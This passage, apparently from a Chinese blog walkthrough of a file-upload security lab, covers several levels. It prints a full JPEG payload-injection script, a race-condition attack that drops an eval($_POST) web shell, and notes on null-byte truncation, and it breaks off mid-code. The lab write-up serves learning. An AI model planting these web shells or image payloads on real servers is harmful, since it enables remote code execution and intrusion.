injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string">"&lt;?=phpinfo();?>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token punctuation">.</span>                     <span class="token variable">$miniPayload</span> <span class="token punctuation">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token punctuation">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token punctuation">.</span>                         <span class="token variable">$miniPayload</span> <span class="token punctuation">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token punctuation">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token punctuation">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string">'payload_'</span><span class="token punctuation">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'payload_'</span><span class="token punctuation">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">DataInputStream</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'File not exists ['</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为1.jpg.</p><h5 id="插入php代码"><a href="#插入php代码" class="headerlink" title="插入php代码"></a>插入php代码</h5><p>使用脚本处理1.jpg,命令<code>php jpg_payload.php 1.jpg</code><br>详细介绍<a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-13</a></p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>条件竞争<br>竞争条件原理介绍<br>网站逻辑：<br>1、网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。<br>2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。<br>在删除之前访问上传的php文件，从而执行上传文件中的php代码。<br>例如：上传文件代码如下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST["cmd"])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Hack:<br>这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。<br>先新建一个php，包含写入一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST["cmd"])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>发两个包，一个是一直上传demo.php,一个是一直访问demo.php<br>通过竞争，可能会写入shell.php<br><img src="14.png" alt=""><br>emm，没跑出来，估计是我拿自己本子处理太快了，写文件太难了，所以简单一些我们写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="15.png" alt=""><br>成功了<br>PS:过了很久不甘心，又跑了一遍写木马，成功了,55555<br><img src="16.png" alt=""></p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>图片马直接上传成功了我滴个乖乖</p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>move_uploaded_file() 00截断<br>主要利用<a href="https://www.freebuf.com/vuls/62811.html" target="_blank" rel="noopener">PHP任意文件上传漏洞（CVE-2015-2348）</a><br>漏洞利用在于</p><pre class=" language-php"><code class="language-php"><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span 